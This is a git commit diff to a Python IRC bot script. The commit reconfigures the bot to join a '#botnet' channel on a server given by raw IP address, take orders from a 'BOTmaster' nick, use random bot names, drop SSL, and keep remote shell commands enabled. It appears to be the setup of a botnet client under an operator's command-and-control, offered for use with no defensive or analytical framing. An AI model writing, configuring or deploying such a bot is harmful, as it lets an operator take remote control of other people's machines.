0c9ad6e374c3ee04dedb60b20e91e2a960f2089f
th3aliencat <th3aliencat@gmail.com>
2020-09-15 13:35:31 -0300

    Atualização Básica

--- bot.py
+++ bot.py
@@ -52,23 +52,23 @@ ip = get('https://api.ipify.org').text # Get public IP address. (used to set bot
 
 #################################################
 ############# Booleans ##########################
-debugmode = False # If True, all print msgs will be active. (use False if you want to run in the background)
-usessl = True # Connect using SSL. (True or False)
+debugmode = True # If True, all print msgs will be active. (use False if you want to run in the background)
+usessl = False # Connect using SSL. (True or False)
 useservpass = False # Use a password to connect to IRC Server. (True or False)
 usesasl = False # Authenticate using SASL. (True or False)
 enableshell = True # Enable Shell commands. (True or False)
 #################################################
 ############# Bot Settings ######################
-server = "irc.freenode.net" # Server to connect to.
-port = 6697 # Port to connect to.
-serverpass = "password" # Password for IRC Server. (UnrealIRCD uses this as default NickServ ident method)
-channel = "#arm0red" # Channel to join on connect.
+server = "8.9.6.231" # Server to connect to.
+port = 6667 # Port to connect to.
+# serverpass = "password" # Password for IRC Server. (UnrealIRCD uses this as default NickServ ident method)
+channel = "#botnet" # Channel to join on connect.
 #botnick = "botnick" # Your bots IRC nick.
 #botnick = "ip" + ip.replace(".", "_") # Set bots nick to IP address, but in proper IRC nick compatible format.
 botnick = "abot["+ str(random.randint(10000,99999)) +"]" # Set bots IRC Nick to abot + 5 random numbers.
-nspass = "password" # Bots NickServ password.
-nickserv = "NickServ" # Nickname service name. (sometimes it's differnet on some networks.)
-adminname = "arm0red" # Bot Master's IRC nick.
+# nspass = "password" # Bots NickServ password.
+# nickserv = "NickServ" # Nickname service name. (sometimes it's differnet on some networks.)
+adminname = "BOTmaster" # Bot Master's IRC nick.
 exitcode = "bye" # Command 'exitcode + botnick' is used to kill the bot.
 #################################################
 #################################################
